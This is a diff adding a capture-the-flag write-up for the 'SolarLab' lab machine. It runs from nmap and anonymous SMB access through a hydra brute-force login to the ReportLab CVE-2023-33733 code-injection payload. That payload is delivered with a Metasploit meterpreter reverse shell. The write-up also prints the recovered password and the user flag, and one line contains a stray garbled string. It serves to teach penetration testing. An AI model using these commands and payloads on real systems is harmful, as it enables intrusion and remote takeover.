@@ -1,0 +1,128 @@
+nmap:
+    PORT     STATE SERVICE       REASON  VERSION
+80/tcp   open  http          syn-ack nginx 1.24.0
+|_http-server-header: nginx/1.24.0
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Did not follow redirect to http://solarlab.htb/
+135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds? syn-ack
+6791/tcp open  http          syn-ack nginx 1.24.0
+|_http-server-header: nginx/1.24.0
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-05-13T13:30:25
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 19522/tcp): CLEAN (Timeout)
+|   Check 2 (port 12958/tcp): CLEAN (Timeout)
+|   Check 3 (port 28194/udp): CLEAN (Timeout)
+|   Check 4 (port 31595/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+|_clock-skew: 8s
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 09:30
+Completed NSE at 09:30, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 09:30
+Completed NSE at 09:30, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 09:30
+Completed NSE at 09:30, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 52.38 seconds
+
+added the hosts to /etc/hosts
+
+there is a smb2 availble to access via smbclient:
+    smbclient //10.129.119.220/Documents -m SMB2 -U Anonymous
+
+inside we can see the old_leave_request_form.docx file
+
+we can download all the content by using mget *
+
+inside the details-file.xlsx we got some credentials:
+Alexander.knight
+KAlexander
+blake.byte
+AlexanderK
+ClaudiaS
+
+tried many different bruteforces to enter the login but nothing zpxsWLNx6kLi41beKuOyY9Jvk7zZfZd75w9PGRfnc4AAADBAOOzmCSzphDCsEmu
+
+then we added to this list:
+
+BBlake
+BlakeB
+SClaudia
+
+and made a bruteforce attack via hydra:
+    hydra -L ~/Desktop/CTF/SolarLab/users.txt -P ~/Desktop/CTF/SolarLab/passwords.txt -V http-form-post://report.solarlab.htb:6791"/login:username=^USER^&password=^PASS^&submit=Login:S=302" -t 10
+    [6791][http-post-form] host: report.solarlab.htb   login: BlakeB   password: ThisCanB3typedeasily1@
+
+now we got the credentials to enter the login page 
+inside we see that there is some options availble 
+
+In Travel Approval we have some form that could used as vector to inject
+
+from the generated pdf we manage to discover the that we have PDF generator is reportlab pdf library
+
+quick search in google showed that we have a CVE for this library (https://github.com/c53elyas/CVE-2023-33733)
+
+so we need to launch and set msfconsole:
+
+    set exploit multi/script/web_delivery
+
+    set payload windows/x64/meterpreter/reverse_tcp
+
+    set srvhost tun0
+
+    set srvport 8082
+
+    run
+
+it should return as a powershell script
+
+this script we need to insert to this payload that we found in cve page
+<para>
+              <font color="[ [ getattr(pow,Word('globals'))['os'].system('Payload here') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, 'eq': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, 'hash': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">
+                exploit
+                </font>
+            </para>
+
+replace the Payload Here string with powershell we provided
+
+now we need to intercept the request in the moment we filled up the fields and submit the generate button
+
+in the destination field we need to insert our payload 
+
+do intercept the response and forward the response with changes
+
+we should get our reverse session
+
+after we do in meterpreter:
+sessions
+
+if we see the session we do:
+sessions -i <id of the session>
+
+and we get the shell
+
+we are blake
+
+cd to Desktop and get the user flag:
+
+7bdf0e2a3ef4157effde6d0278d6d634
